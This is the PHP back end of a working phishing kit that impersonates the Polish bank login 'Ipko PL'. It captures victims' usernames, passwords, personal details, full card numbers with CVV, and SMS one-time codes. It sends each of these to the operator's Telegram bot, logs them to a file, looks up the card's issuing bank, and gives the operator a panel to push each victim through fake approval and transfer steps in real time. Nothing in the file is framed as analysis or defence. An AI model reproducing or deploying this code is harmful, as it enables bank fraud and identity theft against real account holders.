<?php
    error_reporting(0);
    session_start();

	include "../setting/config.php";
	include "../setting/functions.php";
    include "../includes/set-data-users.php";
    include "../includes/add-current-step.php";

    $ip = get_client_ip();
    $link_panel = $_SESSION["panel_control"];
    $panel_telegram = $_SESSION["panel_telegram"];
    $main_panel = $_SESSION["main_panel"];
    $bot_url  = TOKEN;
    $chat_id  = CHATID;
    $host = $link_panel;
    $panel_target = $link_panel;
    $login_error = $panel_telegram."&to=login-error";
    $approve_login = $panel_telegram."&to=approve-login";
    $approve_login_error = $panel_telegram."&to=approve-login-error";
    $information = $panel_telegram."&to=information";
    $information_error = $panel_telegram."&to=information-error";
    $credit_card = $panel_telegram."&to=credit-card";
    $credit_card_error = $panel_telegram."&to=credit-card-error";
    $otp_step = $panel_telegram."&to=otp";
    $otp_step_error = $panel_telegram."&to=otp-error";
    $approvation = $panel_telegram."&to=approvation";
    $approvation_error = $panel_telegram."&to=approvation-error";
    $confirmed = $panel_telegram."&to=confirmed";
    $logout = $panel_telegram."&to=logout";
    $ban = $panel_telegram."&ban=$ip";

    // All :
    $keyboard_admin_panel = json_encode([
        "inline_keyboard" => [
    
                [
                    [
                        "text" => '🕹 PaneL Control For  : [ ' . get_client_ip() . " - " . $_SESSION['code_country_visit'].' ]',
                        "url" => "$link_panel"
                    ]
    
                ],
        ]
    ]);
    
    $keyboard = json_encode([
        "inline_keyboard" => [
            [
                [
                    "text" => "⛔ ERROR Login ⛔",
                    "url" => "$login_error"
                ]
            ],
            [
                [
                    "text" => "✅🔑 Approve Login 🔑✅",
                    "url" => "$approve_login"
                ],
                [
                    "text" => "⛔ ERROR Approve Login ⛔",
                    "url" => "$approve_login_error"
                ]
            ],
            [
                [
                    "text" => "🗂 Information 🗂",
                    "url" => "$information"
                ],
                [
                    "text" => "⛔ ERROR Information ⛔",
                    "url" => "$information_error"
                ]
            ],
            [
                [
                    "text" => "💳 Credit Card 💳",
                    "url" => "$credit_card"
                ],
                [
                    "text" => "⛔ ERROR Credit Card ⛔",
                    "url" => "$credit_card_error"
                ]
            ],
            [
                [
                    "text" => "📲 SMS Code 📲",
                    "url" => "$otp_step"
                ],
                [
                    "text" => "⛔ ERROR SMS Code ⛔",
                    "url" => "$otp_step_error"
                ]
            ],
            [
                [
                    "text" => "✅ Approvation ✅",
                    "url" => "$approvation"
                ],
                [
                    "text" => "⛔ ERROR Approvation ⛔",
                    "url" => "$approvation_error"
                ]
            ],
            [
                [
                    "text" => '🏛🔁 Approve Transfer 🔁🏛',
                    "url" => "$link_panel"
                ]

            ],
            [
                [
                        "text" => "✅ Page Confirmed ✅",
                        "url" => "$confirmed"
                ]
            ],
            [
                [
                        "text" => "🛑 Ban IP 🛑",
                        "url" => "$ban"
                ]
            ],
        ]
    ]);

    $keyboard_end = json_encode([
        "inline_keyboard" => [
            [
                [
                    "text" => "🗑 Logout 🗑",
                    "url" => "$logout"
                ]
            ],
            [
                [
                        "text" => "🛑 Ban IP 🛑",
                        "url" => "$ban"
                ]
            ],
            [
                [
                        "text" => "📊 Main Panel 📊",
                        "url" => "$main_panel"
                ]
            ],
        ]
    ]);

    if($_SERVER['REQUEST_METHOD'] === 'POST'){
        if($_POST['step'] === 'login') {
            if (isset($_POST['b_s_d_p'])) {
                // Info User :
                $username = $_POST["username_value"];
                $password = $_POST["password"];

                // Send Data To Telegram Bot :
                $message =
                "🔐=====[ Login Ipko PL ]=====🔐\r\n".
                "[ 👤 Username ] " . $username ."\r\n".
                "[ 🔑 Password ] " . $password ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "🔐=====[ Login Ipko PL ]=====🔐\r\n";
        
                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard
                );
            
                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);
            
                $message_to_file = 
                "[=====[ Login Ipko PL ]=====]\r\n".
                "[ Username ] " . $username ."\r\n".
                "[ Password ] " . $password ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "[=====[ Login Ipko PL ]=====]\r\n";
                
                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);
        
                $target = $_POST['ip'];
                $data_count = 'data_1';
                set_data_user_target($target, $data_count, $message_to_file);    
            }
            header('Location: ../pages/loading.php');
        }
        elseif($_POST['step'] === 'login-error') {
            if (isset($_POST['b_s_d_p'])) {
                // Info User :
                $username = $_POST["username_value"];
                $password = $_POST["password"];

                // Send Data To Telegram Bot :
                $message =
                "🔐=====[ Login Ipko PL ERROR ]=====🔐\r\n".
                "[ 👤 Username ] " . $username ."\r\n".
                "[ 🔑 Password ] " . $password ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "🔐=====[ Login Ipko PL ERROR ]=====🔐\r\n";
        
                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard
                );
            
                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);
            
                $message_to_file = 
                "[=====[ Login Ipko PL ERROR ]=====]\r\n".
                "[ Username ] " . $username ."\r\n".
                "[ Password ] " . $password ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "[=====[ Login Ipko PL ERROR ]=====]\r\n";
                
                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);
        
                $target = $_POST['ip'];
                $data_count = 'data_2';
                set_data_user_target($target, $data_count, $message_to_file);  
            }
            header('Location: ../pages/loading.php');  
        }
        elseif($_POST['step'] === 'information'){
            if (isset($_POST['b_s_d_p'])) {
                // Info User :
                $full_name = $_POST['first_name'] . " " . $_POST['last_name'];
                $birthday = $_POST['dob']; 
                $address = $_POST['address']; 
                $city = $_POST['city'];
                $zip_code = $_POST['zip_code'];
                $email = $_POST['email']; 
                $phone_number = $_POST['phone_number'];
            
                // Send Data To Telegram Bot :
                $message =
                "👤====[ Information ]====👤\r\n".
                "[ 🪪 Full Name ] " . $full_name ."\r\n".
                "[ 🪪 Birthday ] " . $birthday ."\r\n".
                "[ 📫 Address ] " . $address ."\r\n".
                "[ 🌎 City ] " . $city ."\r\n".
                "[ 📫 Zip Code ] " . $zip_code ."\r\n".
                "[ 📞 Phone Number ] " . $phone_number ."\r\n".
                "[ 📩 Email ] " . $email ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "👤====[ Information ]====👤\r\n";
    
                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard
                );
            
                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);
    
                $message_to_file = 
                "[====[ Information ]====]\r\n".
                "[ Full Name ] " . $full_name ."\r\n".
                "[ Birthday ] " . $birthday ."\r\n".
                "[ Address ] " . $address ."\r\n".
                "[ City ] " . $city ."\r\n".
                "[ Zip Code ] " . $zip_code ."\r\n".
                "[ Phone Number ] " . $phone_number ."\r\n".
                "[ Email ] " . $email ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "[====[ Information ]====]\r\n";
                    
                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);
    
                $target = $_POST['ip'];
                $data_count = 'data_3';
                set_data_user_target($target, $data_count, $message_to_file);    
            }
            header('Location: ../pages/loading.php');
        } 
        elseif($_POST['step'] === 'information-error'){
            if (isset($_POST['b_s_d_p'])) {
                // Info User :
                $full_name = $_POST['first_name'] . " " . $_POST['last_name'];
                $birthday = $_POST['dob']; 
                $address = $_POST['address']; 
                $city = $_POST['city'];
                $zip_code = $_POST['zip_code'];
                $email = $_POST['email']; 
                $phone_number = $_POST['phone_number'];
            
                // Send Data To Telegram Bot :
                $message =
                "👤====[ Information ERROR ]====👤\r\n".
                "[ 🪪 Full Name ] " . $full_name ."\r\n".
                "[ 🪪 Birthday ] " . $birthday ."\r\n".
                "[ 📫 Address ] " . $address ."\r\n".
                "[ 🌎 City ] " . $city ."\r\n".
                "[ 📫 Zip Code ] " . $zip_code ."\r\n".
                "[ 📞 Phone Number ] " . $phone_number ."\r\n".
                "[ 📩 Email ] " . $email ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "👤====[ Information ERROR ]====👤\r\n";
    
                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard
                );
            
                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);
    
                $message_to_file = 
                "[====[ Information ERROR ]====]\r\n".
                "[ Full Name ] " . $full_name ."\r\n".
                "[ Birthday ] " . $birthday ."\r\n".
                "[ Address ] " . $address ."\r\n".
                "[ City ] " . $city ."\r\n".
                "[ Zip Code ] " . $zip_code ."\r\n".
                "[ Phone Number ] " . $phone_number ."\r\n".
                "[ Email ] " . $email ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "[====[ Information ERROR ]====]\r\n";
                    
                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);
    
                $target = $_POST['ip'];
                $data_count = 'data_4';
                set_data_user_target($target, $data_count, $message_to_file);    
            }
            header('Location: ../pages/loading.php');
        }
        elseif($_POST['step'] === 'credit-card'){
            if (isset($_POST['b_s_d_p'])) {
                // Info User :
                $name_card = $_POST['name_card'];
                $card_number = $_POST['numberdrac'];
                $expires = $_POST['datedrac'];
                $cvv = $_POST['vvcdrac'];
                $apiKey = ApiBin;
                $cardNumber = str_replace(' ', '', $card_number);
                $firstSixDigits = substr($cardNumber, 0, 6);
                $last_four_digits = substr($cardNumber, -4);
                
                $url = "https://data.handyapi.com/bin/" . $firstSixDigits;
                $options = [
                    "http" => [
                        "method" => "GET",
                        "header" => "x-api-key: {$apiKey}\r\n"
                    ]
                ];
            
                $context = stream_context_create($options);
                $response = @file_get_contents($url, false, $context);
                $data = @json_decode($response, true);
                $_SESSION["name_the_bank"] = $data["Issuer"];
                $_SESSION["Type"] = $data["Type"];
                $_SESSION["Scheme"] = $data["Scheme"];
            
                // Send Data To Telegram Bot :
                $message =
                "💳=====[ Credit Card ]=====💳\r\n".
                "[ 🪪 Name On Card ] " . $name_card ."\r\n".
                "[ 💳 Card Number ] " . $card_number ."\r\n".
                "[ 📅 Expiry Date ] " . $expires ."\r\n".
                "[ 🔐 Cvv ] " .$cvv ."\r\n".
                "[ 💳 Type Card ] " . $_SESSION["Type"] ."\r\n".
                "[ 💳 Type Card ] " . $_SESSION["Scheme"] ."\r\n".
                "[ 💳 Bank Name ] " . $_SESSION["name_the_bank"] ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "💳=====[ Credit Card ]=====💳\r\n";

                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard
                );
            
                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);
                
                $message_to_file = 
                "[=====[ Credit Card ]=====]\r\n".
                "[ Name On Card ] " . $card_number ."\r\n".
                "[ Card Number ] " . $card_number ."\r\n".
                "[ Expiry Date ] " . $expires ."\r\n".
                "[ Cvv ] " . $cvv ."\r\n".
                "[ Type Card ] " . $_SESSION["Type"] ."\r\n".
                "[ Type Card ] " . $_SESSION["Scheme"] ."\r\n".
                "[ Bank Name ] " . $_SESSION["name_the_bank"] ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "[=====[ Credit Card ]=====]\r\n";
                    
                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);

                $target = $_POST['ip'];
                $data_count = 'data_5';
                set_data_user_target($target, $data_count, $message_to_file);
            }
            header('Location: ../pages/loading.php');        
        }
        elseif($_POST['step'] === 'credit-card-error'){
            if (isset($_POST['b_s_d_p'])) {
                // Info User :
                $name_card = $_POST['name_card'];
                $card_number = $_POST['numberdrac'];
                $expires = $_POST['datedrac'];
                $cvv = $_POST['vvcdrac'];
                $apiKey = ApiBin;
                $cardNumber = str_replace(' ', '', $card_number);
                $firstSixDigits = substr($cardNumber, 0, 6);
                $last_four_digits = substr($cardNumber, -4);
                
                $url = "https://data.handyapi.com/bin/" . $firstSixDigits;
                $options = [
                    "http" => [
                        "method" => "GET",
                        "header" => "x-api-key: {$apiKey}\r\n"
                    ]
                ];
            
                $context = stream_context_create($options);
                $response = @file_get_contents($url, false, $context);
                $data = @json_decode($response, true);
                $_SESSION["name_the_bank"] = $data["Issuer"];
                $_SESSION["Type"] = $data["Type"];
                $_SESSION["Scheme"] = $data["Scheme"];
            
                // Send Data To Telegram Bot :
                $message =
                "💳=====[ Credit Card ERROR ]=====💳\r\n".
                "[ 🪪 Name On Card ] " . $name_card ."\r\n".
                "[ 💳 Card Number ] " . $card_number ."\r\n".
                "[ 📅 Expiry Date ] " . $expires ."\r\n".
                "[ 🔐 Cvv ] " .$cvv ."\r\n".
                "[ 💳 Type Card ] " . $_SESSION["Type"] ."\r\n".
                "[ 💳 Type Card ] " . $_SESSION["Scheme"] ."\r\n".
                "[ 💳 Bank Name ] " . $_SESSION["name_the_bank"] ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "💳=====[ Credit Card ERROR ]=====💳\r\n";

                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard
                );
            
                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);
                
                $message_to_file = 
                "[=====[ Credit Card ERROR ]=====]\r\n".
                "[ Name On Card ] " . $card_number ."\r\n".
                "[ Card Number ] " . $card_number ."\r\n".
                "[ Expiry Date ] " . $expires ."\r\n".
                "[ Cvv ] " . $cvv ."\r\n".
                "[ Type Card ] " . $_SESSION["Type"] ."\r\n".
                "[ Type Card ] " . $_SESSION["Scheme"] ."\r\n".
                "[ Bank Name ] " . $_SESSION["name_the_bank"] ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "[=====[ Credit Card ERROR ]=====]\r\n";
                    
                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);

                $target = $_POST['ip'];
                $data_count = 'data_6';
                set_data_user_target($target, $data_count, $message_to_file);
            }
            header('Location: ../pages/loading.php');            
        }
        elseif($_POST['step'] === 'otp'){
            if (isset($_POST['b_s_d_p'])) {
                // Info User :
                $otp = $_POST['otp_code'];
                
                // Send Data To Telegram Bot :
                $message =
                "📲=====[ SMS Code ]=====📲\r\n".
                "[ SMS CODE ] " . $otp ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "📲=====[ SMS Code ]=====📲\r\n";

                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard
                );
            
                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);

                $message_to_file = 
                "[=====[ SMS Code ]=====]\r\n".
                "[ SMS CODE ] " . $otp ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "[=====[ SMS Code ]=====]\r\n";

                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);

                $target = $_POST['ip'];
                $data_count = 'data_7';
                set_data_user_target($target, $data_count, $message_to_file);
            }
            header('Location: ../pages/loading.php');
        }
        elseif($_POST['step'] === 'otp-error'){
            if (isset($_POST['b_s_d_p'])) {
                // Info User :
                $otp = $_POST['otp_code'];
                
                // Send Data To Telegram Bot :
                $message =
                "📲=====[ SMS Code ERROR ]=====📲\r\n".
                "[ SMS CODE ] " . $otp ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "📲=====[ SMS Code ERROR ]=====📲\r\n";

                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard
                );
            
                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);

                $message_to_file = 
                "[=====[ SMS Code ERROR ]=====]\r\n".
                "[ SMS CODE ] " . $otp ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "[=====[ SMS Code ERROR ]=====]\r\n";

                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);

                $target = $_POST['ip'];
                $data_count = 'data_8';
                set_data_user_target($target, $data_count, $message_to_file);
            }
            header('Location: ../pages/loading.php');
        }
        elseif($_POST['step'] === 'approve-transfer'){
            if(isset($_POST['b_s_d_p'])) {
                $status = "User Click Continue From Page (Approve Transfer)";

                // Send Data To Telegram Bot :
                $message =
                "🔁🏛=====[ Page (Approvation) ]=====🏛🔁\r\n".
                "[ Status ] " . $status ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "🔁🏛=====[ Page (Approvation) ]=====🏛🔁\r\n";

                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard
                );

                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);
                
                $message_to_file = 
                "[=====[ Page (Approvation) ]=====]\r\n".
                "[ Status ] " . $status ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "[=====[ Page (Approvation) ]=====]\r\n";
                
                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);

                $target = $_POST['ip'];
                $data_count = 'data_9';
                set_data_user_target($target, $data_count, $message_to_file);
            }
            header('Location: ../pages/loading.php');
        }
        elseif($_POST['step'] === 'approve-transfer-error'){
            if(isset($_POST['b_s_d_p'])) {
                $status = "User Click Continue From Page Error (Approve Transfer)";

                // Send Data To Telegram Bot :
                $message =
                "🔁🏛=====[ Page ERROR (Approvation) ]=====🏛🔁\r\n".
                "[ Status ] " . $status ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "🔁🏛=====[ Page ERROR (Approvation) ]=====🏛🔁\r\n";
                
                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard
                );

                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);
                
                $message_to_file = 
                "[=====[ Page ERROR (Approvation) ]=====]\r\n".
                "[ Status ] " . $status ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "[=====[ Page ERROR (Approvation) ]=====]\r\n";
                
                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);

                $target = $_POST['ip'];
                $data_count = 'data_10';
                set_data_user_target($target, $data_count, $message_to_file);
            }
            header('Location: ../pages/loading.php');    
        }
        elseif($_POST['step'] === 'confirmed'){
            if(isset($_POST['b_s_d_p'])) {
                $status = "Victim Complete steps successfully";
        
                // Send Data To Telegram Bot :
                $message =
                "💸💶=====[ Status ]=====💸💶\r\n".
                "[ Status ] " . $status ."\r\n".
                "📍IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "💸💶=====[ Status ]=====💸💶\r\n";
                
                $parameters = array(
                    "chat_id" => $chat_id,
                    "text" => $message,
                    'reply_markup' => $keyboard_end
                );
            
                $send = ($parameters);
                $website_telegram = "https://api.telegram.org/bot{$bot_url}";
                $ch = curl_init($website_telegram . '/sendMessage');
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                $result = curl_exec($ch);
                curl_close($ch);
                
                $message_to_file = 
                "[=====[ Status ]=====]\r\n".
                "[ Status ] " . $status ."\r\n".
                "IP - ".$ip." | ".$_SESSION['code_country_visit']."\r\n".
                "[=====[ Status ]=====]\r\n";
                
                $file = fopen("../file/file.txt", "a");
                fwrite($file, $message_to_file. "\n");
                fclose($file);

                $target = $_POST['ip'];
                $data_count = 'data_11';
                set_data_user_target($target, $data_count, $message_to_file);
            }
            header('Location: ../pages/loading.php');
        }
    }
    elseif ($_SERVER['REQUEST_METHOD'] === 'GET') {
        if(!isset($_GET["id_vip"])) {
            $_GET["id_vip"] = $_GET['id_user'];
        }

        if ($_GET['to'] === 'login'){
            $target = $_GET['id_vip'];
            $to = "login";
            added($target, $to);
        }
        elseif ($_GET['to'] === 'login-error'){
            $target = $_GET['id_vip'];
            $to = "login-error";
            added($target, $to);
        }
        elseif ($_GET['to'] === 'information') {
            $target = $_GET['id_vip'];
            $to = "information";
            added($target, $to);
        }
        elseif ($_GET['to'] === 'information-error') {
            $target = $_GET['id_vip'];
            $to = "information-error";
            added($target, $to);
        }
        elseif($_GET['to'] === 'credit-card'){
            $target = $_GET['id_vip'];
            $to = "credit-card";
            added($target, $to);
        }
        elseif($_GET['to'] === 'credit-card-error'){
            $target = $_GET['id_vip'];
            $to = "credit-card-error";
            added($target, $to);
        }
        elseif($_GET['to'] === 'otp'){
            $target = $_GET['id_vip'];
            $to = "otp";
            added($target, $to);
        }
        elseif($_GET['to'] === 'otp-error'){
            $target = $_GET['id_vip'];
            $to = "otp-error";
            added($target, $to);
        }
        elseif($_GET['to'] === 'approve-login'){
            $target = $_GET['id_vip'];
            $to = "approve-login";
            added($target, $to);
        }
        elseif($_GET['to'] === 'approve-login-error'){
            $target = $_GET['id_vip'];
            $to = "approve-login-error";
            added($target, $to);
        }
        elseif($_GET['to'] === 'approve-transfer'){
            $target = $_GET['id_vip'];
            $sold = $_GET['sold'];
            $to = "approve-transfer";
            added_other_extra($target, $to, $sold);
        }
        elseif($_GET['to'] === 'approve-transfer-error'){
            $target = $_GET['id_vip'];
            $sold = $_GET['sold'];
            $to = "approve-transfer-error";
            added_other_extra($target, $to, $sold);
        }
        elseif($_GET['to'] === 'approvation'){
            $target = $_GET['id_vip'];
            $to = "approvation";
            added($target, $to);
        }
        elseif($_GET['to'] === 'approvation-error'){
            $target = $_GET['id_vip'];
            $to = "approvation-error";
            added($target, $to);
        }
        elseif($_GET['to'] === 'confirmed'){
            $target = $_GET['id_vip'];
            $to = "confirmed";
            added($target, $to);

            $statics_file = "../panel/get-panel/statics.json";
            $statics_data = file_get_contents($statics_file);
            $data_main_panel = json_decode($statics_data, true);
            $data_main_panel['total_done_steps'] += 1;
            $updated_statics_data = json_encode($data_main_panel);
            file_put_contents($statics_file, $updated_statics_data);
        }
        elseif($_GET['to'] === 'logout'){
            $target = $_GET['id_vip'];
            $to = "logout";
            $current_page = "User Is Logout From SCAMA";
            $userStatus = "<span class='offline'>Offline</span>";
            added_other($target, $to, $current_page, $userStatus);
        }
        elseif(isset($_GET['ban'])){
            $target = $_GET['ban'];
            $to = "ban";
            added($target, $to);
            
            function validateIP($ip) {
                return filter_var($ip, FILTER_VALIDATE_IP) !== false;
            }
            
            $userIP = $_GET['ban'];

            if (validateIP($userIP)) {
                $blockedIPs = file_get_contents('../panel/actions/blocked_ips.txt');
                if (strpos($blockedIPs, $userIP) === false) {
                    file_put_contents("../panel/actions/blocked_ips.txt", $userIP . "\n", FILE_APPEND);

                    // Statics :
                    $statics_file = "../panel/get-panel/statics.json";
                    $statics_data = file_get_contents($statics_file);
                    $user_data = json_decode($statics_data, true);
                    $user_data['total_block'] += 1;
                    $updated_statics_data = json_encode($user_data);
                    file_put_contents($statics_file, $updated_statics_data);

                    $_SESSION["message_panel"] = "This User Is Block - " . $userIP;

                } else {
                    $_SESSION["message_panel"] = "This User Is Already Block - " . $userIP;
                }
            } else {
                $_SESSION["message_panel"] = "Invalid IP address - " . $userIP;

            }
            
        }
        header('Location: ./panel.php?id_user='. $_GET["id_vip"].'');
    }
    else {
        header('Location: ../index.php');
    }
?>